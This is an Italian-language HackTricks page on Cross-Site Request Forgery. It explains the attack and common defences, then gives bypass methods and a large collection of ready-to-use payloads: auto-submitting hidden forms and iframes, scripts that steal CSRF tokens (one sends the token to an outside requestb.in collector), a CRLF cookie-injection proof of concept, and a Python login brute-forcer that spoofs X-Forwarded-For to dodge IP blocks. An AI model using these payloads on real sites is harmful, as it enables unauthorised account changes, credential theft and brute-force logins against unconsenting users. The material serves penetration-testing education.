# CSRF (Cross Site Request Forgery)

{{#include ../banners/hacktricks-training.md}}

## Cross-Site Request Forgery (CSRF) Spiegato

**Cross-Site Request Forgery (CSRF)** è un tipo di vulnerabilità di sicurezza presente nelle applicazioni web. Consente agli attaccanti di eseguire azioni per conto di utenti ignari sfruttando le loro sessioni autenticate. L'attacco viene eseguito quando un utente, che è loggato su una piattaforma vittima, visita un sito malevolo. Questo sito attiva quindi richieste all'account della vittima attraverso metodi come l'esecuzione di JavaScript, l'invio di moduli o il recupero di immagini.

### Requisiti per un Attacco CSRF

Per sfruttare una vulnerabilità CSRF, devono essere soddisfatte diverse condizioni:

1. **Identificare un'Azione Preziosa**: L'attaccante deve trovare un'azione degna di sfruttamento, come cambiare la password dell'utente, l'email o elevare i privilegi.
2. **Gestione della Sessione**: La sessione dell'utente deve essere gestita esclusivamente tramite cookie o l'intestazione di autenticazione di base HTTP, poiché altre intestazioni non possono essere manipolate a questo scopo.
3. **Assenza di Parametri Imprevedibili**: La richiesta non dovrebbe contenere parametri imprevedibili, poiché possono impedire l'attacco.

### Controllo Rapido

Puoi **catturare la richiesta in Burp** e controllare le protezioni CSRF e per testare dal browser puoi cliccare su **Copia come fetch** e controllare la richiesta:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Difesa Contro il CSRF

Possono essere implementate diverse contromisure per proteggere contro gli attacchi CSRF:

- [**Cookie SameSite**](hacking-with-cookies/#samesite): Questo attributo impedisce al browser di inviare cookie insieme a richieste cross-site. [Ulteriori informazioni sui cookie SameSite](hacking-with-cookies/#samesite).
- [**Condivisione delle risorse cross-origin**](cors-bypass.md): La politica CORS del sito vittima può influenzare la fattibilità dell'attacco, specialmente se l'attacco richiede di leggere la risposta dal sito vittima. [Scopri di più sul bypass CORS](cors-bypass.md).
- **Verifica dell'Utente**: Richiedere la password dell'utente o risolvere un captcha può confermare l'intento dell'utente.
- **Controllo degli Intestazioni Referrer o Origin**: Validare queste intestazioni può aiutare a garantire che le richieste provengano da fonti fidate. Tuttavia, una creazione attenta degli URL può eludere controlli mal implementati, come:
- Utilizzare `http://mal.net?orig=http://example.com` (l'URL termina con l'URL fidato)
- Utilizzare `http://example.com.mal.net` (l'URL inizia con l'URL fidato)
- **Modifica dei Nomi dei Parametri**: Alterare i nomi dei parametri nelle richieste POST o GET può aiutare a prevenire attacchi automatizzati.
- **Token CSRF**: Incorporare un token CSRF unico in ogni sessione e richiedere questo token nelle richieste successive può ridurre significativamente il rischio di CSRF. L'efficacia del token può essere migliorata imponendo CORS.

Comprendere e implementare queste difese è cruciale per mantenere la sicurezza e l'integrità delle applicazioni web.

## Bypass delle Difese

### Da POST a GET

Forse il modulo che vuoi abusare è preparato per inviare una **richiesta POST con un token CSRF ma**, dovresti **controllare** se un **GET** è anche **valido** e se quando invii una richiesta GET il **token CSRF viene ancora convalidato**.

### Mancanza di Token

Le applicazioni potrebbero implementare un meccanismo per **convalidare i token** quando sono presenti. Tuttavia, si verifica una vulnerabilità se la convalida viene completamente saltata quando il token è assente. Gli attaccanti possono sfruttare questo rimuovendo il **parametro** che trasporta il token, non solo il suo valore. Questo consente loro di eludere il processo di convalida e condurre efficacemente un attacco Cross-Site Request Forgery (CSRF).

### Il Token CSRF non è Legato alla Sessione Utente

Le applicazioni **che non legano i token CSRF alle sessioni utente** presentano un significativo **rischio di sicurezza**. Questi sistemi verificano i token rispetto a un **pool globale** piuttosto che garantire che ogni token sia vincolato alla sessione iniziante.

Ecco come gli attaccanti sfruttano questo:

1. **Autenticarsi** utilizzando il proprio account.
2. **Ottenere un token CSRF valido** dal pool globale.
3. **Utilizzare questo token** in un attacco CSRF contro una vittima.

Questa vulnerabilità consente agli attaccanti di effettuare richieste non autorizzate per conto della vittima, sfruttando il **meccanismo di convalida del token inadeguato** dell'applicazione.

### Bypass del Metodo

Se la richiesta utilizza un "**metodo strano**", controlla se la **funzionalità di override del metodo** funziona. Ad esempio, se sta **utilizzando un metodo PUT** puoi provare a **utilizzare un metodo POST** e **inviare**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Questo potrebbe funzionare anche inviando il **parametro \_method all'interno di una richiesta POST** o utilizzando le **intestazioni**:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### Bypass del Token dell'Intestazione Personalizzata

Se la richiesta aggiunge un **intestazione personalizzata** con un **token** alla richiesta come **metodo di protezione CSRF**, allora:

- Testa la richiesta senza il **Token Personalizzato e anche l'intestazione.**
- Testa la richiesta con esattamente **la stessa lunghezza ma un token diverso**.

### Il Token CSRF è Verificato da un Cookie

Le applicazioni possono implementare la protezione CSRF duplicando il token sia in un cookie che in un parametro di richiesta o impostando un cookie CSRF e verificando se il token inviato nel backend corrisponde al cookie. L'applicazione convalida le richieste controllando se il token nel parametro di richiesta si allinea con il valore nel cookie.

Tuttavia, questo metodo è vulnerabile agli attacchi CSRF se il sito web presenta difetti che consentono a un attaccante di impostare un cookie CSRF nel browser della vittima, come una vulnerabilità CRLF. L'attaccante può sfruttare questo caricando un'immagine ingannevole che imposta il cookie, seguita dall'inizio dell'attacco CSRF.

Di seguito è riportato un esempio di come potrebbe essere strutturato un attacco:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input
type="hidden"
name="csrf"
value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img
src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
onerror="document.forms[0].submit();" />
</body>
</html>
```
> [!NOTE]
> Nota che se il **csrf token è correlato con il cookie di sessione, questo attacco non funzionerà** perché dovrai impostare la sessione della vittima, e quindi stai attaccando te stesso.

### Modifica del Content-Type

Secondo [**questo**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), per **evitare richieste preflight** utilizzando il metodo **POST**, questi sono i valori di Content-Type consentiti:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

Tuttavia, nota che la **logica del server può variare** a seconda del **Content-Type** utilizzato, quindi dovresti provare i valori menzionati e altri come **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Esempio (da [qui](https://brycec.me/posts/corctf_2021_challenges)) di invio di dati JSON come text/plain:
```html
<html>
<body>
<form
id="form"
method="post"
action="https://phpme.be.ax/"
enctype="text/plain">
<input
name='{"garbageeeee":"'
value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
</form>
<script>
form.submit()
</script>
</body>
</html>
```
### Bypassare le Richieste Preflight per Dati JSON

Quando si tenta di inviare dati JSON tramite una richiesta POST, utilizzare `Content-Type: application/json` in un modulo HTML non è direttamente possibile. Allo stesso modo, utilizzare `XMLHttpRequest` per inviare questo tipo di contenuto avvia una richiesta preflight. Tuttavia, ci sono strategie per potenzialmente aggirare questa limitazione e verificare se il server elabora i dati JSON indipendentemente dal Content-Type:

1. **Usa Tipi di Contenuto Alternativi**: Impiega `Content-Type: text/plain` o `Content-Type: application/x-www-form-urlencoded` impostando `enctype="text/plain"` nel modulo. Questo approccio testa se il backend utilizza i dati indipendentemente dal Content-Type.
2. **Modifica il Tipo di Contenuto**: Per evitare una richiesta preflight garantendo che il server riconosca il contenuto come JSON, puoi inviare i dati con `Content-Type: text/plain; application/json`. Questo non attiva una richiesta preflight ma potrebbe essere elaborato correttamente dal server se è configurato per accettare `application/json`.
3. **Utilizzo di File SWF Flash**: Un metodo meno comune ma fattibile prevede l'uso di un file SWF flash per aggirare tali restrizioni. Per una comprensione approfondita di questa tecnica, fai riferimento a [questo post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypassare il Controllo del Referrer / Origin

**Evitare l'intestazione Referrer**

Le applicazioni possono convalidare l'intestazione 'Referer' solo quando è presente. Per impedire a un browser di inviare questa intestazione, è possibile utilizzare il seguente tag meta HTML:
```xml
<meta name="referrer" content="never">
```
Questo assicura che l'intestazione 'Referer' venga omessa, potenzialmente eludendo i controlli di validazione in alcune applicazioni.

**Bypass Regexp**

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

Per impostare il nome di dominio del server nell'URL che il Referrer invierà all'interno dei parametri, puoi fare:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head>
<meta name="referrer" content="unsafe-url" />
</head>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState(
"",
"",
"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
)
document.forms[0].submit()
</script>
</body>
</html>
```
### **Bypass del metodo HEAD**

La prima parte di [**questo CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) spiega che [il codice sorgente di Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), un router, è impostato per **gestire le richieste HEAD come richieste GET** senza corpo di risposta - un comune workaround che non è unico per Oak. Invece di un gestore specifico che si occupa delle richieste HEAD, esse vengono semplicemente **date al gestore GET ma l'app rimuove solo il corpo della risposta**.

Pertanto, se una richiesta GET è limitata, puoi semplicemente **inviare una richiesta HEAD che sarà elaborata come una richiesta GET**.

## **Esempi di Exploit**

### **Esfiltrazione del Token CSRF**

Se un **token CSRF** viene utilizzato come **difesa**, puoi provare a **esfiltrarlo** abusando di una vulnerabilità [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) o di una vulnerabilità [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET utilizzando tag HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Altri tag HTML5 che possono essere utilizzati per inviare automaticamente una richiesta GET sono:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
<video src="...">
<source src="..." type="..." />
<video poster="...">
<link rel="stylesheet" href="..." />
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body {
background: url("...");
}
</style>
<bgsound src="...">
<track src="..." kind="subtitles" />
<input type="image" src="..." alt="Submit Button"
/></bgsound>
</body>
</object>
</video>
</video>
</audio>
```
### Richiesta GET del modulo
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### Richiesta POST del modulo
```html
<html>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
method="POST"
action="https://victim.net/email/change-email"
id="csrfform">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src="x" onerror="csrfform.submit();" />
<!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit() //Way 3 to autosubmit
</script>
</body>
</html>
```
### Richiesta POST del modulo tramite iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### **Richiesta POST Ajax**
```html
<script>
var xh
if (window.XMLHttpRequest) {
// code for IE7+, Firefox, Chrome, Opera, Safari
xh = new XMLHttpRequest()
} else {
// code for IE6, IE5
xh = new ActiveXObject("Microsoft.XMLHTTP")
}
xh.withCredentials = true
xh.open(
"POST",
"http://challenge01.root-me.org/web-client/ch22/?action=profile"
)
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on")
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2",
})
</script>
```
### richiesta POST multipart/form-data
```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: { "Content-Type": "application/x-www-form-urlencoded" },
mode: "no-cors",
})
```
### richiesta POST multipart/form-data v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
//  MIME POST request.
xhr.setRequestHeader(
"Content-Type",
"multipart/form-data, boundary=" + boundary
)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body +=
'Content-Disposition: form-data; name="' +
nameVar +
'"; filename="' +
fileName +
'"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

//xhr.send(body);
xhr.sendAsBinary(body)
```
### Inviare una richiesta POST da un iframe
```html
<--! expl.html -->

<body onload="envia()">
<form
method="POST"
id="formulario"
action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva" />
</form>
<body>
<script>
function envia() {
document.getElementById("formulario").submit()
}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
</body>
</body>
```
### **Rubare il token CSRF e inviare una richiesta POST**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest()
xhr.open("POST", POST_URL, true)
xhr.withCredentials = true

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

// This is for debugging and can be removed
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
var xhr = new XMLHttpRequest()
// This tels it to return it as a HTML document
xhr.responseType = "document"
xhr.withCredentials = true
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true)
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token")
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value)
}
}
// Make the request
xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```
### **Rubare il token CSRF e inviare una richiesta Post utilizzando un iframe, un modulo e Ajax**
```html
<form
id="form1"
action="http://google.com?param=VALUE"
method="post"
enctype="multipart/form-data">
<input type="text" name="username" value="AA" />
<input type="checkbox" name="status" checked="checked" />
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1() {
x1 = document.getElementById("i1")
x1d = x1.contentWindow || x1.contentDocument
t = x1d.document.getElementById("token").value

document.getElementById("token").value = t
document.getElementById("form1").submit()
}
</script>
<iframe
id="i1"
style="display:none"
src="http://google.com?param=VALUE"
onload="javascript:f1();"></iframe>
```
### **Rubare il token CSRF e inviare una richiesta POST utilizzando un iframe e un modulo**
```html
<iframe
id="iframe"
src="http://google.com?param=VALUE"
width="500"
height="500"
onload="read()"></iframe>

<script>
function read() {
var name = "admin2"
var token =
document.getElementById("iframe").contentDocument.forms[0].token.value
document.writeln(
'<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
)
document.writeln(
'<input id="username" type="text" name="username" value="' +
name +
'" /><br />'
)
document.writeln(
'<input id="token" type="hidden" name="token" value="' + token + '" />'
)
document.writeln(
'<input type="submit" name="submit" value="Submit" /><br/>'
)
document.writeln("</form>")
document.forms[0].submit.click()
}
</script>
```
### **Rubare il token e inviarlo utilizzando 2 iframe**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRubare il token CSRF con Ajax e inviare un post con un modulo**
```html
<body onload="getData()">
<form
id="form"
action="http://google.com?param=VALUE"
method="POST"
enctype="multipart/form-data">
<input type="hidden" name="username" value="root" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="findtoken" name="token" value="" />
<input type="submit" value="valider" />
</form>

<script>
var x = new XMLHttpRequest()
function getData() {
x.withCredentials = true
x.open("GET", "http://google.com?param=VALUE", true)
x.send(null)
}
x.onreadystatechange = function () {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1]
document.getElementById("findtoken").value = token
document.getElementById("form").submit()
}
}
</script>
</body>
```
### CSRF con Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://six.jh2i.com:50022/test")

const username = "admin"

socket.on("connect", () => {
console.log("connected!")
socket.emit("join", {
room: username,
})
socket.emit("my_room_event", {
data: "!flag",
room: username,
})
})
</script>
```
## CSRF Login Brute Force

Il codice può essere utilizzato per forzare un modulo di accesso utilizzando un token CSRF (sta anche utilizzando l'intestazione X-Forwarded-For per cercare di bypassare un possibile blacklist IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Strumenti <a href="#tools" id="tools"></a>

- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Riferimenti

- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

{{#include ../banners/hacktricks-training.md}}
